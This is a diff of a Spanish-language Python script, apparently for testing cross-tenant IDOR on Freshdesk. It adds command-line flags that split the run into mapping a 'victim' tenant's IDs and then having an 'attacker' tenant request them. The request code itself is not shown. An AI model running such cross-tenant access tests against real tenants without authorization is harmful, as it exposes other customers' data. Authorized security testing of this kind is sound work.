@@ -15,6 +15,7 @@ import requests
 import json
 import sys
 import time
+import argparse
 
 # ─────────────────────────────────────────────────────────────────────────────
 # TENANT A — ATACANTE (nuestra cuenta principal)
@@ -169,6 +170,11 @@ def test_cross_tenant_idor(sess_atacante, tenant_a_url, ids_victima, tenant_b_ur
 
 
 def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--mapeo-solo", action="store_true", help="Ejecutar solo el paso 1 de la cascada (mapear IDs)")
+    parser.add_argument("--ataque-solo", action="store_true", help="Ejecutar el paso 2 de la cascada (cross-tenant attack)")
+    args = parser.parse_args()
+
     print("=" * 60)
     print("  TEST IDOR CROSS-TENANT — Freshdesk")
     print(f"  Atacante: {TENANT_A_URL}")
@@ -201,7 +207,12 @@ def main():
 
     # Mapear IDs del Tenant B (víctima)
     ids_victima = mapear_ids_tenant(sess_b, TENANT_B_URL, "TENANT B (VÍCTIMA)")
+    
+    if args.mapeo_solo:
+        print("\n✅ MAPEO COMPLETADO CON ÉXITO. Puede avanzar al paso 2 de ataque.")
+        sys.exit(0)
 
+    # Si llega acá, es un test completo o un --ataque-solo
     # TEST PRINCIPAL: Atacante intenta acceder a IDs de la víctima
     hallazgos = test_cross_tenant_idor(sess_a, TENANT_A_URL, ids_victima, TENANT_B_URL)
 
